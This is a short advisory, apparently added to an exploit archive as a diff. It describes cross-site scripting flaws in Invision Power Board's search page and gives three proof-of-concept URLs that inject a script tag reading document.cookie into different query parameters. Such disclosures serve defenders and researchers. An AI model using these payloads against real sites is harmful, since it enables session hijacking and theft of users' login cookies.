@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/17144/info
+
+Invision Power Board is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input. 
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+http://www.example.com/forum/index.php?act=Search&nav=au&CODE=show&searchid=5f25843edb0242889889796819a2b367&search_in=ooo&result_type='><script>alert(document.cookie)</script>
+http://www.example.com/forum/index.php?act=Search&nav=au&CODE=show&searchid=5f25843edb0242889889796819a2b367&search_in='><script>alert(document.cookie)</script>&result_type=posts
+http://www.example.com/forum/index.php?act=Search&nav='><script>alert(document.cookie)</script>
